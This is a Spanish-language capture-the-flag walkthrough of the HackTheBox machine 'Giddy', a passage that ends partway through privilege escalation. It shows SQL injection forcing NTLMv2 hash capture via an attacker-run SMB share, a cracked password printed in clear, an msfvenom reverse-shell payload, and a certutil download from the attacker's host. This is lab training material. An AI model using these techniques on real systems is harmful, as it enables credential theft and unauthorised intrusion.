3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: GIDDY
|   NetBIOS_Domain_Name: GIDDY
|   NetBIOS_Computer_Name: GIDDY
|   DNS_Domain_Name: Giddy
|   DNS_Computer_Name: Giddy
|   Product_Version: 10.0.14393
|_  System_Time: 2024-04-26T18:49:46+00:00
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>Giddy
| Not valid before: 2024-04-25T18:44:55
|_Not valid after:  2024-10-25T18:44:55
|_ssl-date: 2024-04-26T18:49:53+00:00<span class="p">;</span> <span class="nt">-6s</span> from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: <span class="nt">-6s</span>, deviation: 0s, median: <span class="nt">-6s</span>
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Nos estamos enfrentando a un <strong>Windows 10</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme rdp 10.129.96.140
RDP         10.129.96.140   3389   GIDDY            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 or Windows Server 2016 Build 14393 <span class="o">(</span>name:GIDDY<span class="o">)</span> <span class="o">(</span>domain:Giddy<span class="o">)</span> <span class="o">(</span>nla:True<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Estas son las tecnologías que corre por detrás la pagina web.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">96.140</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">96.140</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">96.140</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">IIS</span> <span class="no">Windows</span> <span class="no">Server</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">ASP</span><span class="o">.</span><span class="no">NET</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/1.png" />
</p>

<ul>
  <li>Si damos <code class="language-plaintext highlighter-rouge">click</code> en la imagen nos lleva aquí.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/2.png" />
</p>

<ul>
  <li>La razón es por que en el código fuente hay una etiqueta la cual al dar <code class="language-plaintext highlighter-rouge">click</code> en la imagen nos redirige a esa ruta.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/3.png" />
</p>

<ul>
  <li>Vamos a hacer <code class="language-plaintext highlighter-rouge">Fuzzing</code> para ver si encontramos rutas interesantes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.129.96.140 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 80 <span class="nt">--no-error</span>
<span class="o">===============================================================</span>
Gobuster v3.6
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://10.129.96.140
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 80
<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.6
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/remote               <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 157] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> /Remote/default.aspx?ReturnUrl<span class="o">=</span>%2fremote]
/<span class="k">*</span>checkout<span class="k">*</span>           <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>docroot<span class="k">*</span>            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>                    <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/mvc                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 148] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.129.96.140/mvc/]
/http%3A%2F%2Fwww     <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A              <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/q%26a                <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">**</span>http%3a            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>http%3A             <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">**</span>http%3A            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fyoutube <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fblogs   <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fblog    <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/Remote               <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 157] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> /Remote/default.aspx?ReturnUrl<span class="o">=</span>%2fRemote]
/<span class="k">**</span>http%3A%2F%2Fwww   <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/s%26p                <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/%3FRID%3D2671        <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/devinmoore<span class="k">*</span>          <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/200109<span class="k">*</span>              <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>sa_                 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>dc_                 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fcommunity <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/Chamillionaire%20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/Clinton%20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/DJ%20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fradar   <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/q%26a2               <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/login%3f             <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/Shakira%20Oral%20Fixation%201%20%26%202 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fjeremiahgrossman <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fweblog  <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fswik    <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
Progress: 220546 / 220547 <span class="o">(</span>100.00%<span class="o">)</span>
<span class="o">===============================================================</span>
Finished
<span class="o">===============================================================</span>
</code></pre></div></div>

<ul>
  <li>Bueno si nos vamos a la parte de <code class="language-plaintext highlighter-rouge">Remote</code> encontramos esto pero no tenemos credenciales.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/4.png" />
</p>

<ul>
  <li>Si vamos ala ruta <code class="language-plaintext highlighter-rouge">mvc</code> nada interesante.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/5.png" />
</p>

<h2 id="sql-injection">SQL Injection</h2>

<ul>
  <li>Si selecciono un producto la <strong>URL</strong> ya es interesante.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/6.png" />
</p>

<ul>
  <li>Si pongo una <code class="language-plaintext highlighter-rouge">'</code> después de <code class="language-plaintext highlighter-rouge">id=28</code>  nos devuelve un error además de que vemos un usuario <code class="language-plaintext highlighter-rouge">jnogueira</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/7.png" />
</p>

<ul>
  <li>
    <p>Estamos ante una maquina Windows a si que lo que podemos hacer es jugar con el <code class="language-plaintext highlighter-rouge">xp_dirtree</code> sabiendo que corre <code class="language-plaintext highlighter-rouge">mysql</code> por detrás <a href="https://stackoverflow.com/questions/26750054/xp-dirtree-in-sql-server">https://stackoverflow.com/questions/26750054/xp-dirtree-in-sql-server</a>.</p>
  </li>
  <li>
    <p>Si vemos el recurso vemos que comparten una <code class="language-plaintext highlighter-rouge">query</code> que al parecer se esta usando para robar el hash NTLMv2 de algún usuario ya que se conecta algún recurso compartido podemos nosotros compartir uno para intentarlo.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Downloads impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</code></pre></div></div>

<ul>
  <li>Pero nada.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/8.png" />
</p>

<ul>
  <li>Si revisamos el error nos dice <code class="language-plaintext highlighter-rouge">Incorrect syntar near '</code> así que vamos a probar quitándole la <code class="language-plaintext highlighter-rouge">'</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/9.png" />
</p>

<ul>
  <li>Y funciona nos llega el hash del usuario <code class="language-plaintext highlighter-rouge">Stacy</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Downloads impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.129.96.140,49709<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>GIDDY<span class="se">\S</span>tacy,GIDDY<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User GIDDY<span class="se">\S</span>tacy authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Stacy::GIDDY:aaaaaaaaaaaaaaaa:fd090e689929af2ccc006414acc9091c:01010000000000000050ab281298da0166fd32f6cb3311030000000001001000650050005200740050004500440068000300100065005000520074005000450044006800020010006f006a0065006f004700740061004100040010006f006a0065006f004700740061004100070008000050ab281298da0106000400020000000800300030000000000000000000000000300000670f571a29eefa618339fbbf9271e7c33d87cc2100fa14d9046c67efb0dcd8ce0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00320031003600000000000000000000000000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>GIDDY<span class="se">\S</span>tacy,GIDDY<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User GIDDY<span class="se">\S</span>tacy authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Stacy::GIDDY:aaaaaaaaaaaaaaaa:2d920fc42f14ee67db3416f7bfb13486:010100000000000080e643291298da01927a3a66ded6d3fe0000000001001000650050005200740050004500440068000300100065005000520074005000450044006800020010006f006a0065006f004700740061004100040010006f006a0065006f0047007400610041000700080080e643291298da0106000400020000000800300030000000000000000000000000300000670f571a29eefa618339fbbf9271e7c33d87cc2100fa14d9046c67efb0dcd8ce0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00320031003600000000000000000000000000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.129.96.140,49709<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remaining connections <span class="o">[]</span>
</code></pre></div></div>

<h2 id="stacy">Stacy</h2>

<ul>
  <li>Vamos a crackear el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
xNnWo6272k7x     <span class="o">(</span>Stacy<span class="o">)</span>
1g 0:00:00:16 DONE <span class="o">(</span>2024-04-26 13:47<span class="o">)</span> 0.05899g/s 158644p/s 158644c/s 158644C/s xabat..x9831915x
Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>El usuario <code class="language-plaintext highlighter-rouge">Stacy</code> forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme winrm 10.129.96.140 <span class="nt">-u</span> <span class="s1">'stacy'</span> <span class="nt">-p</span> <span class="s1">'xNnWo6272k7x'</span>
SMB         10.129.96.140   5985   NONE             <span class="o">[</span><span class="k">*</span><span class="o">]</span> None <span class="o">(</span>name:10.129.96.140<span class="o">)</span> <span class="o">(</span>domain:None<span class="o">)</span>
HTTP        10.129.96.140   5985   NONE             <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.96.140:5985/wsman
WINRM       10.129.96.140   5985   NONE             <span class="o">[</span>+] None<span class="se">\s</span>tacy:xNnWo6272k7x <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora ya podemos conectarnos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.96.140 <span class="nt">-u</span> <span class="s1">'stacy'</span> <span class="nt">-p</span> <span class="s1">'xNnWo6272k7x'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>giddy<span class="se">\s</span>tacy
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Vemos la primera flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
e7d6583b3852e4219ee8c8e1b83aa588
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>Si recordamos tenemos Un <code class="language-plaintext highlighter-rouge">Windows PowerShell Web Access</code> así que podemos conectarnos por allí también.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/12.png" />
</p>

<ul>
  <li>Pero básicamente es lo mismo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/13.png" />
</p>

<ul>
  <li>Encontramos un archivo interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>ocuments&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>ocuments


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>        6/17/2018   9:36 AM              6 unifivideo
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/14.png" />
</p>

<ul>
  <li>Tiene vulnerabilidades.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content searchsploit unifi video
<span class="nt">--------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                        |  Path
<span class="nt">--------------------------------------</span> <span class="nt">---------------------------------</span>
Ubiquiti Networks UniFi Video Default | php/webapps/39268.java
Ubiquiti UniFi Video 3.7.3 - Local Pr | windows/local/43390.txt
<span class="nt">--------------------------------------</span> <span class="nt">---------------------------------</span>
Shellcodes: No Results
</code></pre></div></div>

<ul>
  <li>Si examinamos el <code class="language-plaintext highlighter-rouge">windows/local/43490.txt</code> nos dice donde esta instalado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5. VULNERABILITY DETAILS
<span class="o">========================</span>
Ubiquiti UniFi Video <span class="k">for </span>Windows is installed to <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\u</span><span class="s2">nifi-v
ideo</span><span class="se">\"</span><span class="s2">
by default and is also shipped with a service called "</span>Ubiquiti UniFi Vid
eo<span class="s2">". Its
executable "</span>avService.exe<span class="s2">" is placed in the same directory and also runs
 under
the NT AUTHORITY/SYSTEM account.
</span></code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        6/16/2018   9:54 PM                bin
d-----        6/16/2018   9:55 PM                conf
d-----        6/16/2018  10:56 PM                data
d-----        6/16/2018   9:54 PM                email
d-----        6/16/2018   9:54 PM                fw
d-----        6/16/2018   9:54 PM                lib
d-----        4/26/2024   2:48 PM                logs
d-----        6/16/2018   9:55 PM                webapps
d-----        6/16/2018   9:55 PM                work
<span class="nt">-a----</span>        7/26/2017   6:10 PM         219136 avService.exe
<span class="nt">-a----</span>        6/17/2018  11:23 AM          31685 hs_err_pid1992.log
<span class="nt">-a----</span>        8/16/2018   7:48 PM         270597 hs_err_pid2036.mdmp
<span class="nt">-a----</span>        6/16/2018   9:54 PM            780 Ubiquiti UniFi Video.lnk
<span class="nt">-a----</span>        7/26/2017   6:10 PM          48640 UniFiVideo.exe
<span class="nt">-a----</span>        7/26/2017   6:10 PM          32038 UniFiVideo.ico
<span class="nt">-a----</span>        6/16/2018   9:54 PM          89050 Uninstall.exe
</code></pre></div></div>

<ul>
  <li>Además nos dicen que tenemos capacidad de escritura.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>However the default permissions on the <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\u</span><span class="s2">nifi-video"</span> <span class="nb">fold
</span>er are
inherited from <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData"</span> and are not explicitly overridden, which
 allows
all <span class="nb">users</span>, even unprivileged ones, to append and write files to the appl
ication
directory:

c:<span class="se">\P</span>rogramData&gt;icacls unifi-video
unifi-video NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
CREATOR OWNER:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>RX<span class="o">)</span>
BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>CI<span class="o">)(</span>WD,AD,WEA,WA<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Y si es correcto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; <span class="nb">echo </span>prueba <span class="o">&gt;</span> prueba
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        6/16/2018   9:54 PM                bin
d-----        6/16/2018   9:55 PM                conf
d-----        6/16/2018  10:56 PM                data
d-----        6/16/2018   9:54 PM                email
d-----        6/16/2018   9:54 PM                fw
d-----        6/16/2018   9:54 PM                lib
d-----        4/26/2024   2:48 PM                logs
d-----        6/16/2018   9:55 PM                webapps
d-----        6/16/2018   9:55 PM                work
<span class="nt">-a----</span>        7/26/2017   6:10 PM         219136 avService.exe
<span class="nt">-a----</span>        6/17/2018  11:23 AM          31685 hs_err_pid1992.log
<span class="nt">-a----</span>        8/16/2018   7:48 PM         270597 hs_err_pid2036.mdmp
<span class="nt">-a----</span>        4/26/2024   4:11 PM             18 prueba
<span class="nt">-a----</span>        6/16/2018   9:54 PM            780 Ubiquiti UniFi Video.lnk
<span class="nt">-a----</span>        7/26/2017   6:10 PM          48640 UniFiVideo.exe
<span class="nt">-a----</span>        7/26/2017   6:10 PM          32038 UniFiVideo.ico
<span class="nt">-a----</span>        6/16/2018   9:54 PM          89050 Uninstall.exe
</code></pre></div></div>

<ul>
  <li>Nos dicen que cuando arrancas el servicio arranque un <code class="language-plaintext highlighter-rouge">.exe</code> que no existe en el directorio por defecto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Upon start and stop of the service, it tries to load and execute the file at
<span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\u</span><span class="s2">nifi-video</span><span class="se">\t</span><span class="s2">askkill.exe"</span><span class="nb">.</span> However this file does not exist <span class="k">in
</span>the application directory by default at all.
</code></pre></div></div>

<ul>
  <li>
    <p>Lo que debemos hacer es crear ese <code class="language-plaintext highlighter-rouge">.exe</code>.</p>
  </li>
  <li>
    <p>Para crear binarios podemos usar <code class="language-plaintext highlighter-rouge">msfvenom</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.216 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> exe <span class="nt">-o</span> taskkill.exe
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: taskkill.exe
</code></pre></div></div>

<ul>
  <li>Ahora lo vamos a subir ala maquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3 <span class="nt">-m</span> http.server 8080
Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.216:8080/taskkill.exe taskkill.exe
<span class="k">****</span>  Online  <span class="k">****</span>
  0000  ...
  1c00
CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
</code></pre></div></div>

<ul>
  <li>Si nos ponemos en escucha y lo ejecutamos para ver si nos llega una <code class="language-plaintext highlighter-rouge">reverse shell</code> vemos el siguiente error.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; .<span class="se">\t</span>askkill.exe
The term <span class="s1">'.\taskkill.exe'</span> is not recognized as the name of a cmdlet, <span class="k">function</span>, script file, or operable program. Check the spelling of the name, or <span class="k">if </span>a path was included, verify that the path is correct and try again.
At line:1 char:1
+ .<span class="se">\t</span>askkill.exe
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: <span class="o">(</span>.<span class="se">\t</span>askkill.exe:String<span class="o">)</span> <span class="o">[]</span>, CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
</code></pre></div></div>

<ul>
  <li>Si lo hacemos rápido vemos que el Windows Defender lo detecta como virus.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; .<span class="se">\t</span>askkill.exe
